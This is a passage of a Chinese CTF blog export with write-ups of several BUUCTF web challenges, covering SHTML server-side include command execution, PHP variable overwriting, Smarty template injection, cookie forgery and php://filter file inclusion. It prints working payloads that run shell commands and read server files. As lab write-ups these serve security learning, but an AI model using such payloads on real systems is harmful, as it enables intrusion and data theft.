<p>知道了如何利用之后，我们需要构造payload，也就是需要知道username和password的值。</p>
<p>因为<code>fwrite($shtml,$text);</code>以及text的内容，得知username的值就是我们需要执行的bash命令。
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">         $text = &#x27;</span><br><span class="line">         ***</span><br><span class="line">         ***</span><br><span class="line">         &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt;</span><br><span class="line">         ***</span><br><span class="line">***&#x27;;</span><br></pre></td></tr></table></figure></p>
<p>接着确定password的值。通过<code>if ( $admin == substr(md5($_POST['password']),0,6))</code>了解到，输入的password经过md5加密后取其前6位字符构成的子串，该子串必须与$admin相等，也就是前6个字符必须为<code>6d0bc1</code>。直接编写如下脚本：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5  </span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> count  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;start!&quot;</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> count():   <span class="comment"># 从0开始一直累加</span></span><br><span class="line">    h = md5(<span class="built_in">str</span>(i).encode()).hexdigest()  <span class="comment"># MD5加密</span></span><br><span class="line">    <span class="keyword">if</span> h[:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;find it! the password is: &quot;</span> + <span class="built_in">str</span>(i))  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>最终找到password=2020666。因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;find / -name flag*&#x27;--&gt;&amp;password=2020666 -&gt; 找flag文件</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114737.png" /></p>
<p>访问shtml文件：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419114915.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=&lt;!--#exec cmd=&#x27;cat /var/www/html/flag_990c66bf85a09c664f0b6741840499b2&#x27;--&gt;&amp;password=2020666 -&gt; get flag</span><br></pre></td></tr></table></figure>
<p>同样的，访问对应的shtml文件，得到flag</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115013.png" /></p>
<h1 id="参考">3. 参考</h1>
<ul>
<li><a href="https://www.cnblogs.com/Areas/p/5096899.html">SHTML 教程 -
Areas - 博客园</a></li>
<li><a href="https://imagin.vip/?p=166">BJDCTF Web Write Up – Imagin's
Blog</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
        <tag>MD5碰撞</tag>
        <tag>shtml命令执行</tag>
        <tag>vim泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a
href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境就发现这应该是一个网站模板，查看了源码以及数据包，发现都没有任何信息。在网页最下方有一个留言，随便输入之后发送发现
url 产生了变化。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
<p>故测试是否存在注入的可能，后来发现并没有。走投无路的情况下就进行目录扫描，发现存在
<code>.git</code> 泄露。（我用 <code>dirsearch</code>
扫不出来，不知道为什么。）</p>
<h1 id="解题">解题</h1>
<p>将源码下载后查看了发现了两个 php 文件。</p>
<p>index.php（重要部分） <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
<p>接下来进行代码审计。</p>
<blockquote>
<p>这里先说明一个知识点<code>$_GET as $x =&gt; $y</code>，假设get方式传入
flag=abc，那么这句代码的意思是 <code>$x=flag, $y=abc</code>。</p>
</blockquote>
<p>再看完 flag.php 之后再看 index.php，一开始的思路就是绕过前面的
if，然后执行最后的 <code>echo "the flag is: ".$flag;</code> 即可获得
flag。</p>
<p>需要get传入参数才能触发第一个if，要满足第一个if的话，需要至少传入两个参数
<code>p1=str&amp;flag=p1</code>（这里p1和str任意，p1不能为flag），因此绕过也很简单。查看第二个if，只需要传入flag参数即可，无论什么方式。接下来查看第三个if，只要参数flag的值不为flag即可。</p>
<p>这么一看，绕过彷佛很简单，只需要get或者post传入<code>flag=abc</code>即可。但是注意到最前面的两个<code>foreach</code>，这才是本题的考点。假设我们<code>flag=abc</code>以get方式传入，那么经过第二个<code>foreach</code>：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$x</span>=flag, <span class="variable">$y</span>=abc</span><br><span class="line"><span class="number">2</span>. <span class="variable">$$x</span>=<span class="variable">$flag</span>, <span class="variable">$$y</span>=<span class="variable">$abc</span></span><br><span class="line"><span class="number">3</span>. 因为<span class="variable">$abc</span>并不存在，所以为空，即<span class="variable">$flag</span>=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="number">4</span>. 这样即使绕过了，输入的flag也为空</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330205641.png" /></p>
<p>post方式也是一样，会被第一个<code>foreach</code>修改flag值。</p>
<p>因此，绕过这个方法行不通。此时注意到有三个地方有 <code>exit</code>
该函数虽然会退出程序，但是在退出之前也会将变量打印出来。因此，接下来的思路有三个：</p>
<ol type="1">
<li>`<span class="math inline">\(handsome=\)</span>flag``</li>
<li><code>$yds=$flag</code></li>
<li>`<code>$is=$flag</code></li>
</ol>
<p>看思路1，我们需要get方式传入
<code>handsome=flag&amp;flag=handsome</code>，<strong>注意顺序</strong>。此时的执行过程如下：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$handsome</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$handsome</span>为flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$handsome</span> -&gt; <span class="variable">$flag</span>获取<span class="variable">$handsome</span>的值，也就是flag</span><br><span class="line"><span class="number">3</span>. 输出 <span class="variable">$handsome</span>，也就是flag</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211022.png" /></p>
<p>看思路2，这个是最简单的，只需要get方式传入
<code>yds=flag</code>，此时： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$yds</span>=<span class="variable">$flag</span></span><br><span class="line">然后输出 <span class="variable">$yds</span>，即flag</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211048.png" /></p>
<p>看思路3之前，我们得先明白，参数只能通过第二个<code>foreach</code>才行，也就是必须用get方式传入<code>is=flag</code>，如果是post传入则会变成<code>$is=flag</code>那么输出就真的是“flag”了（笑）。接下来需要满足第三个if才能输出，也就是还需要传入一个参数flag，且值为flag。如果用post传入，则经过第一个
<code>foreach</code>，就会变成 <code>$flag=flag</code>，此时后面即使
<code>$is=$flag</code>，输出的也是“flag”。因此只能通过get传入，因此最终的payload为
<code>is=flag&amp;flag=flag</code>，这里顺序无所谓。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. <span class="variable">$is</span>=<span class="variable">$flag</span> -&gt; <span class="variable">$is</span>获得flag</span><br><span class="line"><span class="number">2</span>. <span class="variable">$flag</span>=<span class="variable">$flag</span> -&gt; 什么都没改变</span><br><span class="line"><span class="number">3</span>. 输出<span class="variable">$is</span>，即flag</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330211638.png" /></p>
<h1 id="总结">总结</h1>
<p>本题考察的是 <strong>php变量覆盖漏洞</strong>。 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="variable">$$a</span>=<span class="string">&#x27; world&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">此时的结果为：hello world</span><br><span class="line">解释：因为 <span class="variable">$a</span>=<span class="string">&#x27;hello&#x27;</span>，所以 <span class="variable">$$a</span>=<span class="variable">$hello</span>=<span class="string">&#x27; world&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220330212116.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>git泄露</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 The mystery of ip</title>
    <url>/2022/03/22/BJDCTF2020%20The%20mystery%20of%20ip/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境后发现什么都没有，查看源码也没有。点击 <code>flag</code> 和
<code>hint</code> 都没有。抓包也没找到有用信息，因此想到扫描目录吧。
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322201937.png" /></p>
<p>发现有
<code>.DS_Store</code>，因此可能有信息泄露，但是下载下来发现，一堆乱码。此时注意到题目：<code>The_mystery_of_ip</code>，并且
<code>hint.php</code> 源码中提示到
<code>&lt;!-- Do you know why i know your ip? --&gt;</code>，忽然想到
<code>XFF</code>。</p>
<h1 id="解题">解题</h1>
<p>进入 <code>flag.php</code> 然后抓包，修改 <code>XFF</code>。 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322202806.png" /></p>
<p>说明此题的突破点就在这里，但是实在想不到，看了别人的 writeup
才知道这里考的是模板注入。</p>
<p>先尝试 <code>&#123;&#123;2*3&#125;&#125;</code>，结果如下 <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204148.png" /></p>
<p>发现确实如此，输入 <code>&#123;&#123;php&#125;&#125;</code> <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204358.png" /></p>
<p>发现是 <code>smarty</code>。</p>
<p><code>smarty</code> 存在命令执行： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">exec — 执行一个外部程序  </span><br><span class="line">passthru — 执行外部程序并且显示原始输出  </span><br><span class="line">proc_close — 关闭由 proc_open 打开的进程并且返回进程退出码  </span><br><span class="line">proc_open — 执行一个命令，并且打开用来输入/输出的文件指针。  </span><br><span class="line">popen — 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。  </span><br><span class="line">proc_terminate — 杀除由 proc_open 打开的进程  </span><br><span class="line">shell_exec — 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。  </span><br><span class="line">system — 执行外部程序，并且显示输出  </span><br><span class="line">scandir 列出指定路径中的文件和目录  </span><br><span class="line"><span class="keyword">eval</span> — 把字符串作为PHP代码执行  </span><br><span class="line">assert --函数直接将传入的参数当成PHP代码执行</span><br></pre></td></tr></table></figure></p>
<p>输入 payload：<code>&#123;&#123;passthru("ls /")&#125;&#125;</code> <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204751.png" /></p>
<p>发现 flag，利用 <code>&#123;&#123;passthru("cat /flag")&#125;&#125;</code> <img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220322204858.png" /></p>
<p>成功get。</p>
<h1 id="总结">总结</h1>
<ul>
<li>模板注入是 CTF 中常考的题目，这里着实没想到。</li>
<li>要注意题目环境中的各种信息，比如这题中的题目想到
<code>XFF</code>。</li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2019 Futurella</title>
    <url>/2022/04/19/BSidesCF%202019%20Futurella/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BBJDCTF2020%5DEasySearch">Futurella</a></p>
<p>这题目就很简单...</p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p>进入环境，得到如下信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115556.png" /></p>
<p>讲英语翻译过来的意思就是：<strong>阻止外星人！我们在垃圾箱里找到这张纸条，我们认为这是外星人的东西！你能够理解它吗？</strong></p>
<h1 id="解题">2. 解题</h1>
<h2 id="方法1">2.1. 方法1</h2>
<p>我按照惯例查看了一下源码，结果就发现了flag！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220419115805.png" /></p>
<p>最开始还以为是假的，没想到是真的！</p>
<h2 id="方法2">2.2. 方法2</h2>
<p>发现这些特殊的字符可以被选中，因此将它们复制粘贴，也可以得到如下信息：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Resistance is futile! Bring back Futurella or we&#x27;ll invade!</span><br><span class="line"></span><br><span class="line">Also, the flag is flag&#123;c1e7c9de-8b5b-4a0a-a406-596f5663a4c1&#125;</span><br></pre></td></tr></table></figure></p>
<p>这其实就是源码中的内容。</p>
<h1 id="番外">3. 番外</h1>
<p>对比外星文和原来的内容，从倒数第三行和最后一行的<code>&#123;</code>,
<code>&#125;</code>比较容易看出来这是flag的前后花括号，因此猜测，每一个外星字符对应一个英文字符。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2019 Kookie</title>
    <url>/2022/04/20/BSidesCF%202019%20Kookie/</url>
    <content><![CDATA[<p>题目地址：<a
href="https://buuoj.cn/challenges#%5BBSidesCF%202019%5DKookie">Kookie</a></p>
<span id="more"></span>
<h1 id="题目信息">1. 题目信息</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100044.png" /></p>
<p>主页面是一个登录框，并且给了一个账户cookie/monster。要求让我们用admin登录。</p>
<h1 id="解题">2. 解题</h1>
<p>根据题目提示，本题可能跟cookie有关，因此先尝试用给的账户登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100151.png" /></p>
<p>刷新并抓取数据包</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100235.png" /></p>
<p>可以看到cookie被设置为username=cookie，而我们登录的账号也是cookie。因此，有理由猜测如果我们将cookie设置为username=admin，就可以伪装admin进行登录。经过验证，确实如此：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220420100422.png" /></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
      </tags>
  </entry>
  <entry>
    <title>BSidesCF 2020 Had a bad day</title>
    <url>/2022/03/29/BSidesCF%202020%20Had%20a%20bad%20day/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境之后，页面有两个选择</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133629.png" /></p>
<p>这时候选哪个都会跳出对应的图片（狗或者猫），并且 url 出现变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6bea1108-6e3e-4c6b-9295-bf25d2c8e728.node4.buuoj.cn:81/index.php?category=meowers</span><br></pre></td></tr></table></figure>
<p>此时打开源码发现：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329133835.png" /></p>
<p>每刷新一次这个红框里的图片都会变化，因此，可能存在文件包含。</p>
<h1 id="解题">解题</h1>
<p>尝试看一下报错有没有信息，发现输入任何东西都只会提示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, we currently only support woofers and meowers.</span><br></pre></td></tr></table></figure>
<p>可是这并不算报错，因此，尝试一下
<code>?category=meowers.php</code>，此时发现报错了！</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329134329.png" /></p>
<p>此时，可以确定本题是文件包含，函数为 <code>include()</code>。</p>
<p>利用伪协议 <code>php://filter</code> 尝试读取一下
<code>index.php</code> ，payload 如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>发现报错了，报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: include(php://filter/read=convert.base64-encode/resource=index.php.php): failed to open stream: operation failed in /var/www/html/index.php on line 37</span><br></pre></td></tr></table></figure></p>
<p>注意文件名后有两个php，猜测后台在我们传入的参数后面加上了
<code>.php</code>，因此构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?category=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure></p>
<p>成功读取源码，base64解码后，将重要内容整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>( strpos( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || strpos( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">		<span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>通过代码审计知道：</p>
<ol type="1">
<li>需要传入参数 category</li>
<li>category 需要包含 <code>woofers</code>， <code>meowers</code>，
<code>index</code> 三者之一</li>
<li>我们传入的文件名不需要包含 .php</li>
</ol>
<p>假设我们读取的是
<code>flag</code>，那么我们就要带上上述的第二点的其中一个，这就是本题的难点，有两种payload：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. ?category=php://filter/read=convert.base64-encode/resource=index/../flag</span><br><span class="line">2. ?category=php://filter/read=convert.base64-encode/index/resource=flag</span><br></pre></td></tr></table></figure></p>
<p>两者都能得到结果（第二个payload就是 <code>php://filter</code>
伪协议嵌套），但是如果使用第二种，会出现报错信息：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329201529.png" /></p>
<p>这里不是很懂，不过根据结果可以猜测，<code>index</code>
的位置上应该放的是 filter
这个伪协议的选项，而index并不是，所以这里报错了，但是这并不影响整体的执行。</p>
<h1 id="总结">总结</h1>
<p>通过本题可以学到： <code>php://filter</code> 伪协议的嵌套。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP伪协议</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF 2018 Online Tool</title>
    <url>/2022/03/22/BUUCTF%202018%20Online%20Tool/</url>
    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; </span><br><span class="line">	<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>])) &#123; </span><br><span class="line">	highlight_file(<span class="keyword">__FILE__</span>);  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line">	<span class="variable">$host</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">	<span class="variable">$host</span> = escapeshellarg(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$host</span> = escapeshellcmd(<span class="variable">$host</span>); </span><br><span class="line">	<span class="variable">$sandbox</span> = md5(<span class="string">&quot;glzjin&quot;</span>. <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.<span class="variable">$sandbox</span>;  </span><br><span class="line">    @mkdir(<span class="variable">$sandbox</span>); </span><br><span class="line">    chdir(<span class="variable">$sandbox</span>);  </span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="variable">$host</span>);  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure></p>
<p>从上面可以看出以下几点： - 以GET方式传入 <code>host</code>； -
<code>host</code> 要经过
<code>escapeshellarg</code>，<code>escapeshellcmd</code>
两个函数。但是对这两个函数现在一无所知； - <code>sandbox</code>
就是路径地址； - <code>system</code> 函数说明本题应该是命令执行；</p>
<p>现在最大的问题就是第二点的两个函数的作用。</p>
<h1
id="escapeshellarg和escapeshellcmd作用">escapeshellarg和escapeshellcmd作用</h1>
<h2 id="escapeshellarg函数">escapeshellarg函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg ( <span class="keyword">string</span> <span class="variable">$arg</span> ) : <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用：
将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入
shell
函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。</p>
<p>看解释可能不明白什么意思，接下来看一个例子。</p>
<p>脚本如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到 <code>escapeshellarg</code>
会在所有单引号前添加转义符号，变成 <code>\'</code>
然后在这两个字符外阔上单引号<code>'\''</code>。因此，上述例子中会将原来的
<code>'</code> 变成
<code>'\''</code>，然后在整个字符串外面添加单引号。回过头看
<strong>将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</strong>
就很明确了。</p>
<h2 id="escapeshellcmd函数">escapeshellcmd函数</h2>
<p>语法： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellcmd(<span class="keyword">string</span> <span class="variable">$command</span>): <span class="keyword">string</span></span><br></pre></td></tr></table></figure></p>
<p>作用： escapeshellcmd() 对字符串中可能会欺骗 shell
命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec()
或 system()
函数，或者执行操作符之前进行转义。反斜线（）会在以下字符之前插入：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;  #  ; `  |  *  ?  ~  &lt;  &gt;  ^  (  )  [  ]  &#123;  &#125;  $  \, \x0A  \xFF</span><br></pre></td></tr></table></figure> <code>'</code>和 <code>"</code> 仅在不配对的时候被转义。
在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p>
<p>看一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;&lt;?php phpinfo(&#x27;x&#x27;);?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$host1</span> = escapeshellarg(<span class="variable">$host</span>);</span><br><span class="line"><span class="variable">$host2</span> = escapeshellcmd(<span class="variable">$host1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$host2</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo(&#x27;x&#x27;);?&gt;</span><br><span class="line">&#x27;&lt;?php phpinfo(&#x27;\&#x27;&#x27;x&#x27;\&#x27;&#x27;);?&gt;&#x27;</span><br><span class="line">&#x27;\&lt;\?php phpinfo\(&#x27;\\&#x27;&#x27;x&#x27;\\&#x27;&#x27;\)\;\?\&gt;&#x27;</span><br></pre></td></tr></table></figure></p>
<p>可以看到它在众多符号面前都添加了转移符号 <code>\</code> 。</p>
<h2 id="两者一起用的漏洞">两者一起用的漏洞</h2>
<p>例子来源于：<a href="https://paper.seebug.org/164/">PHP
escapeshellarg()+escapeshellcmd() 之殇</a></p>
<ol type="1">
